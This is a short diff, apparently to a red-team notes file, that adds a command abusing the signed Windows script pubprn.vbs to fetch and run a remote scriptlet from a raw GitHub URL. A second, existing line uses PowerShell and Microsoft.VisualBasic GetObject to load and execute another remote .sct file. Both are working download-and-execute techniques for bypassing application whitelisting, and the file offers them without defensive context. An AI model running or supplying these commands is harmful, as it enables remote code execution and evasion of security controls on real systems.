@@ -1,3 +1,8 @@
+SCT via CScript:
+
+cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/analyticsearch/SCTandXML/master/scriptcalc.sct
+
+
 SCT via Microsoft.JScript:
 
 [Reflection.Assembly]::LoadWithPartialName('Microsoft.VisualBasic');[Microsoft.VisualBasic.Interaction]::GetObject('script:https://raw.githubusercontent.com/analyticsearch/SCTandXML/master/script.sct').Exec(0)
